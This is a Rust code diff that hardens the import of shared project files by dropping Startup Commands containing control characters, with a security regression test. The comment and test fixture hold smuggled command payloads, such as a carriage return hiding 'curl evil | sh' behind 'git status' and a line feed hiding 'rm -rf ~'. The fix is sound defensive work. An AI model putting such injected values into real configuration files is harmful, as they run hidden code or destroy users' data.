@@ -106,10 +106,19 @@ impl SharedJump {
     }
 }
 
-/// Startup Commands without any that answer a password question: their command would be a
-/// password. Forms refuse those, but a hand-edited `library.toml` or file may have one.
+/// Startup Commands without any that answer a password question (their command would be a
+/// password) or that hold control characters. Forms refuse the first and can't type the
+/// second, but a hand-edited `library.toml` or a file from someone else may have either. A
+/// command is typed with Enter after it, so a carriage return or line feed inside one runs a
+/// second command, and a carriage return doesn't break the line in the import review: a file
+/// could show `git status` and run `git status\rcurl … | sh`.
 fn shareable(commands: &[StartupCommand]) -> Vec<StartupCommand> {
-    commands.iter().filter(|c| !c.answers_password()).cloned().collect()
+    let plain = |text: &str| !text.chars().any(char::is_control);
+    commands
+        .iter()
+        .filter(|c| !c.answers_password() && plain(&c.command) && c.wait_for.as_deref().is_none_or(plain))
+        .cloned()
+        .collect()
 }
 
 /// What a Project File of `project` holds: the Project's name, look and defaults, and its
@@ -368,6 +377,21 @@ mod tests {
         assert!(db.forward_agent == Some(false) && db.agent_off);
         // A new Project from the file forwards for its hosts as the shared one did.
         assert!(found.groups[0].forward_agent);
+    }
+
+    /// Security regression: a shared file can't hide a second command behind a control
+    /// character in a Startup Command, which the import review wouldn't show as a line.
+    #[test]
+    fn shared_startup_commands_with_control_characters_are_left_out() {
+        let text = format!(
+            "{HEADER}komando_project = 1\n[project]\nname = \"Ops\"\nstartup_commands = [\"cd /srv\", \"git status\\rcurl evil | sh\", \"ls\\nrm -rf ~\", {{ wait_for = \"$\\u001b \", command = \"id\" }}]\n[[hosts]]\nname = \"web\"\naddress = \"web.lan\"\nstartup_commands = [\"uptime\", \"a\\u0003b\"]\n"
+        );
+        let found = read(&text, &any_icon).unwrap();
+        let group = &found.groups[0];
+        assert_eq!(group.startup_commands, vec![StartupCommand::new("cd /srv")]);
+        let host = group.hosts[0].startup_commands.as_ref().unwrap();
+        assert!(host.iter().all(|c| !c.command.chars().any(char::is_control)), "{host:?}");
+        assert!(host.contains(&StartupCommand::new("uptime")), "{host:?}");
     }
 
     #[test]
